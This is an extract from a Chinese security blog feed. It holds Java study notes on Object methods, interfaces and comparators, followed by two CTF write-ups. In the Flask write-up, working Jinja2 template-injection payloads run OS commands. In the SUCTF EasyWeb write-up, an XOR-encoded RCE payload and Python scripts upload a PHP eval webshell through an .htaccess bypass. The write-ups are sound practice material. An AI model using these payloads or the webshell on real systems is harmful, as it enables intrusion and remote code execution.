alt="image-20220307225003737"></p><h2 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307225623364.png" alt="image-20220307225623364"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307230404578.png" alt="image-20220307230404578"></p><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307230702220.png" alt="image-20220307230702220"></p><h3 id="to-string"><a href="#to-string" class="headerlink" title="to_string"></a>to_string</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307231033786.png" alt="image-20220307231033786"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307231050043.png" alt="image-20220307231050043"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232014058.png" alt="image-20220307232014058"></p><p>原方法</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232032977.png" alt="image-20220307232032977"></p><p>重写后</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232136187.png" alt="image-20220307232136187"></p><p>直接alt+insert添加即可</p><h3 id="getClass"><a href="#getClass" class="headerlink" title="getClass()"></a>getClass()</h3><p>获取运行时类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232536412.png" alt="image-20220307232536412"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307232551295.png" alt="image-20220307232551295"></p><h3 id="finalize"><a href="#finalize" class="headerlink" title="finalize"></a>finalize</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233825712.png" alt="image-20220307233825712"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233742142.png" alt="image-20220307233742142"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307233200553.png" alt="image-20220307233200553"></p><h3 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h3><p>用于返回当前对象的hash码</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234118067.png" alt="image-20220307234118067"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234327319.png" alt="image-20220307234327319"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234646637.png" alt="image-20220307234646637"></p><p>重写hashcode()方法，尽量让不同对象产生的hash码不一样</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307234725681.png" alt="image-20220307234725681"></p><h3 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308000837040.png" alt="image-20220308000837040"></p><p>equals 只能比较引用类型数据</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307235240218.png" alt="image-20220307235240218"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308000516442.png" alt="image-20220308000516442"></p><h2 id="空指针异常"><a href="#空指针异常" class="headerlink" title="空指针异常"></a>空指针异常</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004815978.png" alt="image-20220308004815978"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004823230.png" alt="image-20220308004823230"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220308004929031.png" alt="image-20220308004929031"></p><h2 id="抽象初识"><a href="#抽象初识" class="headerlink" title="抽象初识"></a>抽象初识</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309001110049.png" alt="image-20220309001110049"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309001857256.png" alt="image-20220309001857256"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003126201.png" alt="image-20220309003126201"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309002153677.png" alt="image-20220309002153677"></p><h2 id="抽象注意点"><a href="#抽象注意点" class="headerlink" title="抽象注意点"></a>抽象注意点</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003553843.png" alt="image-20220309003553843"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309003622175.png" alt="image-20220309003622175"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309004543157.png" alt="image-20220309004543157"></p><h2 id="接口初识"><a href="#接口初识" class="headerlink" title="接口初识"></a>接口初识</h2><p>如何声明接口：</p><p>接口：定义规范</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010955198.png" alt="image-20220309010955198"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010752566.png" alt="image-20220309010752566"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309010914703.png" alt="image-20220309010914703"></p><p>接口也有多态</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011210309.png" alt="image-20220309011210309"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011357791.png" alt="image-20220309011357791"></p><p>注意：</p><p>接口中的抽象方法默认被 public abstract 修饰</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011610133.png" alt="image-20220309011610133"></p><p>接口中的全局静态常量默认被</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309011859135.png" alt="image-20220309011859135"></p><p>这三个修饰</p><p>一个类可以实现多个接口</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012134974.png" alt="image-20220309012134974"></p><p>一个类实现接口后，如果不想实现接口中的抽象方法，则自己必须变为抽象类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012443711.png" alt="image-20220309012443711"></p><hr><p>添加默认方法：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309012838207.png" alt="image-20220309012838207"></p><p>这个方法不是每个实现这个接口的类都必须要重写的，按需使用。比如飞机和小鸟，只有飞机需要加油，小鸟并不需要。</p><p>添加静态方法：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013126800.png" alt="image-20220309013126800"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013720061.png" alt="image-20220309013720061"></p><p>接口也可以进行多继承：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309013858147.png" alt="image-20220309013858147"></p><p>一个类可以先继承一个父类，再去实现多个接口，顺序不能改变，必须先继承再改变</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309014202863.png" alt="image-20220309014202863"></p><h2 id="接口的非正常情况"><a href="#接口的非正常情况" class="headerlink" title="接口的非正常情况"></a>接口的非正常情况</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015249961.png" alt="image-20220309015249961"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015303113.png" alt="image-20220309015303113"></p><p>这两个接口有重名的方法，当实现的时候就会报错</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015327271.png" alt="image-20220309015327271"></p><p>解决方法：在类中重写 study方法</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015415696.png" alt="image-20220309015415696"></p><p>但是，但我们想要调用接口的study方法该怎么办？</p><p>重写study后这样调用：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015757108.png" alt="image-20220309015757108"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015510568.png" alt="image-20220309015510568"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309015547202.png" alt="image-20220309015547202"></p><h2 id="comparable接口"><a href="#comparable接口" class="headerlink" title="comparable接口"></a>comparable接口</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309020503383.png" alt="image-20220309020503383"></p><p>使用comparable接口完成引用数据类型的比较</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309020938494.png" alt="image-20220309020938494"></p><p>需要实现：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021013901.png" alt="image-20220309021013901"></p><p>重写Comparable</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021220640.png" alt="image-20220309021220640"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220309021248580.png" alt="image-20220309021248580"></p><h1 id="day12-面向对象"><a href="#day12-面向对象" class="headerlink" title="day12 面向对象"></a>day12 面向对象</h1><h2 id="comparable接口-内部比较器"><a href="#comparable接口-内部比较器" class="headerlink" title="comparable接口-内部比较器"></a>comparable接口-内部比较器</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220317222648883.png" alt="image-20220317222648883"></p><pre><code class="java">package com.sakura.neibu;public class Test &#123;    public static void main(String[] args) &#123;    Person p1 = new Person(&quot;李白&quot;,40);    Person p2 = new Person(&quot;杜甫&quot;,30);    int i = p1.compareTo(p2);    if(i&gt;0)&#123;        System.out.println(p1.name+&quot;&gt;&quot;+p2.name);    &#125;else if(i&lt;0)&#123;            System.out.println(p1.name+&quot;&lt;&quot;+p2.name);        &#125;else &#123;        System.out.println(p1.name+&quot;=&quot;+p2.name);    &#125;    &#125;&#125;class Person implements Comparable&#123;    @Override    public int compareTo(Object o) &#123;        Person p = (Person)o;        return this.age-p.age;    &#125;    String name;    int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220321223505628.png" alt="image-20220321223505628"></p><h2 id="Comparator接口-外部比较器"><a href="#Comparator接口-外部比较器" class="headerlink" title="Comparator接口-外部比较器"></a>Comparator接口-外部比较器</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322223441069.png" alt="image-20220322223441069"></p><p>代码范例:</p><p>Person.java</p><pre><code class="java">package com.sakura.waibu;public class Person &#123;    String name;    int age;    double salary;    public Person(String name, int age, double salary) &#123;        this.name = name;        this.age = age;        this.salary = salary;    &#125;    public Person() &#123;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;&#125;</code></pre><p>PerSortOfAge.java</p><pre><code class="java">package com.sakura.waibu;import java.util.Comparator;public class PersonSortOfAge implements Comparator &#123;    @Override    public int compare(Object o1, Object o2) &#123;        Person p1 = (Person)o1;        Person p2 = (Person)o2;        return p1.age-p2.age;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.waibu;public class Test &#123;    public static void main(String[] args) &#123;        Person p1 = new Person(&quot;李白&quot;,60,6666.55);        Person p2 = new Person(&quot;杜甫&quot;,58,8888);        PersonSortOfAge sortOfAge = new PersonSortOfAge();        int res = sortOfAge.compare(p1,p2);        if(res &gt; 0)&#123;            System.out.println(p1.name+&quot;&gt;&quot;+p2.name);        &#125;else if(res &lt; 0)&#123;            System.out.println(p2.name+&quot;&lt;&quot;+p1.name);        &#125;else &#123;            System.out.println(p1.name+&quot;=&quot;+p2.name);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322225423524.png" alt="image-20220322225423524"></p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220322232627649.png" alt="image-20220322232627649"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本篇文章更新java系列知识—持续更新中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png&quot; alt=&quot;image-202202</summary>
      
    
    
    
    <category term="语言" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="java" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/java/"/>
    
    
    <category term="java" scheme="https://sakurahack-y.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</title>
    <link href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/"/>
    <id>https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</id>
    <published>2022-02-11T02:24:11.000Z</published>
    <updated>2022-02-11T03:30:55.289Z</updated>
    
    <content type="html"><![CDATA[<h1 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h1><p>这道题是模板注入。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p><h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;发现漏洞&quot;&gt;&lt;a href=&quot;#发现漏洞&quot; class=&quot;headerlink&quot; title=&quot;发现漏洞&quot;&gt;&lt;/a&gt;发现漏洞&lt;/h1&gt;&lt;p&gt;这道题是模板注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/11/RootersCTF2019-I-3-Flas</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF 2019 EasyWeb_0x61-0x6F</title>
    <link href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/"/>
    <id>https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/</id>
    <published>2022-02-10T07:03:00.000Z</published>
    <updated>2022-02-10T13:51:12.046Z</updated>
    
    <content type="html"><![CDATA[<p>呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。</p><p>源码贴上来：</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png" alt="image-20220210150538110"></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png" alt="image-20220210150849473"></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png" alt="image-20220210150949879"></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code class="php">&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png" alt="image-20220210151113658"></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png" alt="image-20220210152555350"></p><p>成功出来phpinfo，看一看有没有可以利用的点</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png" alt="image-20220210152650640"></p><p>发现执行系统的命令全被禁用了，看来rce走不通了。</p><p>这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png" alt="image-20220210152821670"></p><p>不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。</p><p>既然rce走不通，那就试一试文件上传吧</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png" alt="image-20220210152933281"></p><p>各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。</p><p>但是上传.htaccess仍然有<img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png" alt="image-20220210204915083"></p><p>这个函数限制。</p><p>解决这个函数，采用xbm格式，X Bit Map</p><pre><code>在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：</code></pre><pre><code>#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;</code></pre><p>在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。</p><p>所以我们在.htaccess里加上</p><pre><code>#define width 1337#define height 1337..........</code></pre><p>就可以绕过绕过这个函数了。</p><p>上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对&lt;?进行了检测。</p><p>这里有两种方法可以绕过。</p><p>1、对一句话木马的内容进行base64编码。</p><p>2、使用 utf-16be 来绕过</p><p>下面先附上两种方法的exp：</p><p>1、</p><pre><code class="python">import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;)#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = &quot;http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;files = &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image/jpeg&#39;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#39;file&#39;:(&#39;shell.ahhh&#39;,shell,&#39;image/jpeg&#39;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre><p>本题php环境为7.2，所以无法使用<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;shell&#39;]);&lt;/script&gt;</code>这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。</p><p>得到</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png" alt="image-20220210212049717"></p><p>2、</p><pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;def generate_php_file(filename, script):    phpfile = open(filename, &#39;wb&#39;)     phpfile.write(script.encode(&#39;utf-16be&#39;))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)    htaccess.write(SIZE_HEADER)    htaccess.write(b&#39;AddType application/x-httpd-php .lethe\n&#39;)    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)    htaccess.write(b&#39;php_value display_errors 1\n&#39;)    htaccess.close()        generate_htacess()generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)</code></pre><p>同理上传即可</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png" 